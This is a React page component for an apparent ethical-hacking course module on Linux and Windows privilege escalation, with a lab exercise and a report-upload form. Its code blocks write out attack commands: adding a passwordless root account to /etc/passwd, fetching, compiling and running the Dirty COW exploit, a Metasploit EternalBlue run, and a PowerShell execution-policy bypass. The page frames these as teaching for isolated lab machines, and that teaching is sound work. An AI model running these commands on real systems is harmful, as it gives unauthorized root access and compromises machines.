import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import {
  FaArrowLeft,
  FaCode,
  FaList,
  FaLink,
  FaEdit,
  FaCheckCircle,
  FaRocket,
  FaBookOpen,
  FaUserShield,
} from "react-icons/fa";
import { useAuth } from "../../../context/authContext";

const Dett8: React.FC = () => {
  const navigate = useNavigate();
  const { userData, userToken } = useAuth();

  // State for submission field
  const [submitted, setSubmitted] = useState(false);
  const [form, setForm] = useState({
    assignmentId: 8,
    userId: userData?.userDetails.id ?? "",
    fileUrl: "",
  });

  // Handle file upload for PDF submissions
  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file && file.type === "application/pdf") {
      // Simulate file upload to a server (replace with actual upload logic)
      const fileUrl = URL.createObjectURL(file); // Temporary URL for demo
      setForm((prev) => ({
        ...prev,
        fileUrl: fileUrl,
      }));
    } else {
      alert("Please upload a valid PDF file.");
    }
  };

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Form Data:", form);

    if (!userToken) {
      alert("Authentication error. Please log in again.");
      return;
    }

    try {
      const response = await fetch("http://localhost:8080/api/v1/assignments/submit", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${userToken}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(form),
      });

      if (response.ok) {
        setSubmitted(true);
        alert("Assignment submitted successfully!");
      } else {
        const errorData = await response.json();
        alert(`Error: ${errorData.message}`);
      }
    } catch (error) {
      console.error("Error submitting assignment:", error);
      alert("Failed to submit. Please try again later.");
    }
  };

  return (
    <>
      <section className="bg-white shadow-lg rounded-lg p-4 sm:p-6 md:p-8 mb-8 mx-auto max-w-5xl">
        {/* Back Button */}
        <button
          onClick={() => navigate(-1)}
          className="flex items-center text-gray-600 hover:text-indigo-600 mb-6 transition-all duration-300 ease-in-out transform hover:scale-105 p-2"
        >
          <FaArrowLeft className="mr-2 text-lg" />
          Back
        </button>

        {/* Section Heading */}
        <div className="bg-indigo-600 text-white py-4 px-6 rounded-t-lg flex items-center">
          <FaUserShield className="mr-3 text-2xl" />
          <h1 className="text-2xl sm:text-3xl font-extrabold uppercase">Privilege Escalation</h1>
        </div>

        <div className="p-4 sm:p-6">
          {/* Introduction to Privilege Escalation */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
              <FaEdit className="mr-2 text-indigo-600" />
              Introduction to Privilege Escalation
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Privilege escalation is a critical phase in penetration testing where an attacker gains higher-level access (e.g., from a standard user to root/admin) on a compromised system. This can be achieved through kernel exploits, misconfigurations, or weak permissions on Linux and Windows systems. This module builds on exploitation basics from <code>Dett6</code> and password attacks from <code>Dett7</code>, focusing on techniques to escalate privileges and their implications. These skills are essential for Week 5’s system security audit and prepare students for real-world penetration testing and Capture The Flag (CTF) challenges.
            </p>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
              Mastering privilege escalation enables ethical hackers to demonstrate the full impact of vulnerabilities and recommend robust defenses. All activities must be conducted in controlled lab environments with explicit permission to comply with legal and ethical standards, ensuring responsible testing.
            </p>
          </div>

          {/* Understanding Privilege Escalation */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaCode className="mr-2 text-indigo-600" />
              Understanding Privilege Escalation
            </h2>
            <div className="space-y-6">
              {/* What is Privilege Escalation? */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  1. What is Privilege Escalation?
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Privilege escalation occurs when an attacker gains elevated access beyond their initial permissions, such as moving from a low-privileged user to root (Linux) or SYSTEM/administrator (Windows). It can be vertical (gaining higher privileges) or horizontal (accessing another user’s privileges).
                </p>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
                  Example: Exploiting a vulnerable Linux kernel to gain root access or abusing a Windows service misconfiguration to obtain SYSTEM privileges.
                </p>
              </div>

              {/* Linux Privilege Escalation */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  2. Linux Privilege Escalation
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Linux privilege escalation often exploits kernel vulnerabilities, misconfigured permissions, or insecure SUID binaries. Common techniques include:
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li>
                    <strong>Kernel Exploits:</strong> Target outdated or vulnerable kernel versions (e.g., Dirty COW, CVE-2016-5195).
                  </li>
                  <li>
                    <strong>SUID/SGID Binaries:</strong> Exploit binaries with set user ID permissions to execute as root.
                  </li>
                  <li>
                    <strong>Misconfigured Cron Jobs:</strong> Modify scripts run by root via cron.
                  </li>
                  <li>
                    <strong>Weak File Permissions:</strong> Exploit writable configuration files (e.g., /etc/passwd).
                  </li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Check kernel version
uname -r
# Search for kernel exploits
searchsploit linux kernel 4.4
# Example: Dirty COW exploit
git clone https://github.com/dirtycow/dirtycow.github.io
gcc -pthread dirty.c -o dirty
./dirty
# Check SUID binaries
find / -perm -u=s -type f 2>/dev/null
# Example: Exploit writable /etc/passwd
echo "hacker::0:0:root:/root:/bin/bash" >> /etc/passwd`}
                </pre>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
                  Tools: LinPEAS (Linux Privilege Escalation Awesome Script) automates enumeration of potential escalation vectors.
                </p>
              </div>

              {/* Windows Privilege Escalation */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  3. Windows Privilege Escalation
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Windows privilege escalation exploits unpatched systems, misconfigured services, or weak permissions. Common techniques include:
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li>
                    <strong>Kernel Exploits:</strong> Target vulnerabilities like EternalBlue (MS17-010).
                  </li>
                  <li>
                    <strong>Unquoted Service Paths:</strong> Exploit services with spaces in file paths.
                  </li>
                  <li>
                    <strong>Token Impersonation:</strong> Steal higher-privileged tokens (e.g., via Meterpreter’s <code>getsystem</code>).
                  </li>
                  <li>
                    <strong>Weak Registry Permissions:</strong> Modify registry keys to gain elevated access.
                  </li>
                </ul>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Check Windows version
systeminfo
# Search for Windows exploits
searchsploit windows 10
# Use Metasploit for EternalBlue
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.20
exploit
# Check service permissions
sc qc vulnerable_service
# Enumerate with PowerUp (PowerShell)
powershell -ep bypass
Import-Module PowerUp.ps1
Invoke-AllChecks`}
                </pre>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
                  Tools: PowerUp (Windows) and WinPEAS enumerate escalation vectors, while Metasploit delivers exploits.
                </p>
              </div>

              {/* Ethical and Mitigation Considerations */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  4. Ethical and Mitigation Considerations
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Privilege escalation carries significant risks and requires strict adherence to ethical guidelines:
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li>
                    <strong>Authorization:</strong> Obtain written permission before attempting escalation, even in labs.
                  </li>
                  <li>
                    <strong>Scope:</strong> Limit actions to approved systems to avoid unintended damage.
                  </li>
                  <li>
                    <strong>Controlled Environment:</strong> Use isolated VMs to prevent impact on live systems.
                  </li>
                  <li>
                    <strong>Reporting:</strong> Document escalation methods, impact, and mitigation strategies (e.g., patch systems, restrict permissions).
                  </li>
                  <li>
                    <strong>Mitigations:</strong> Apply patches, use least privilege principles, monitor logs, and restrict SUID binaries/services.
                  </li>
                </ul>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
                  Unauthorized escalation can lead to legal consequences and system instability, emphasizing the need for ethical practices.
                </p>
              </div>
            </div>
          </div>

          {/* Practical Exercise */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaRocket className="mr-2 text-indigo-600" />
              Practical Exercise: Privilege Escalation on Linux
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Apply privilege escalation skills by gaining root access on a vulnerable Linux system in a safe lab environment. Submit a PDF report documenting your process, results, and mitigation recommendations. (Note: Windows escalation can be explored in advanced labs.)
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Set up two VMs in VirtualBox (Kali Linux: <code>192.168.56.10/24</code>, Ubuntu: <code>192.168.56.20/24</code>) using a Host-Only network (from <code>Dett7</code>).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                On the Ubuntu VM, configure a vulnerable kernel (e.g., Ubuntu 16.04 with kernel 4.4, vulnerable to Dirty COW) and create a low-privileged user (<code>testuser</code>).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                On the Kali VM, gain initial access to the Ubuntu VM as <code>testuser</code> (e.g., via SSH with credentials from <code>Dett7</code>).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Enumerate the Ubuntu system for escalation vectors (e.g., kernel version, SUID binaries) using manual commands or LinPEAS.
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Exploit a kernel vulnerability (e.g., Dirty COW) to gain root access.
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Verify root access (e.g., <code>whoami</code>, access <code>/root</code>) and document the process.
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Create a PDF report (200–300 words) detailing the escalation method, results, and mitigations (e.g., update kernel, restrict permissions).
              </li>
            </ul>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4">
              Here’s a starter guide for the lab:
            </p>
            <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
              {`# On Ubuntu VM (192.168.56.20)
# Install vulnerable kernel (e.g., Ubuntu 16.04, kernel 4.4)
sudo apt update
# Create low-privileged user
sudo useradd -m testuser
echo "testuser:password123" | sudo chpasswd
sudo systemctl start ssh

# On Kali VM (192.168.56.10)
# SSH into Ubuntu as testuser
ssh testuser@192.168.56.20
# Enumerate system
uname -r
find / -perm -u=s -type f 2>/dev/null
# Download LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
# Exploit Dirty COW
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirty.c
gcc -pthread dirty.c -o dirty
./dirty
# Verify root
whoami
cat /root/flag.txt
# Document results
# Create PDF report using a text editor or reporting tool
`}
            </pre>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4 italic">
              Complete the exercise, test your setup, and submit your PDF report below!
            </p>
          </div>

          {/* PDF Submission */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaLink className="mr-2 text-indigo-600" />
              Submit Your Work
            </h2>
            <form onSubmit={handleSubmit} className="space-y-4">
              <label
                className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                htmlFor="fileUrl"
              >
                Upload Your PDF Report:
              </label>
              <input
                type="file"
                name="fileUrl"
                accept="application/pdf"
                className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                onChange={handleFileUpload}
              />
              <button
                type="submit"
                className="bg-indigo-600 text-white py-2 px-6 rounded-md hover:bg-indigo-700 transition-all duration-300 ease-in-out transform hover:scale-105"
              >
                Submit Exercise
              </button>
            </form>
            {submitted && (
              <p className="mt-4 text-green-600 font-medium flex items-center">
                <FaCheckCircle className="mr-2" />
                Your exercise has been submitted successfully!
              </p>
            )}
          </div>

          {/* Privilege Escalation Resources */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaBookOpen className="mr-2 text-indigo-600" />
              Privilege Escalation Resources
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Deepen your privilege escalation skills with these resources:
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://github.com/carlospolop/PEASS-ng"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  PEASS-ng - LinPEAS and WinPEAS Tools
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://book.hacktricks.xyz/linux-unix/privilege-escalation"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  HackTricks - Linux Privilege Escalation
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://book.hacktricks.xyz/windows/windows-privilege-escalation"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  HackTricks - Windows Privilege Escalation
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://tryhackme.com/path/outline/privilegeescalation"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  TryHackMe - Privilege Escalation Learning Path
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>
    </>
  );
};

export default Dett8;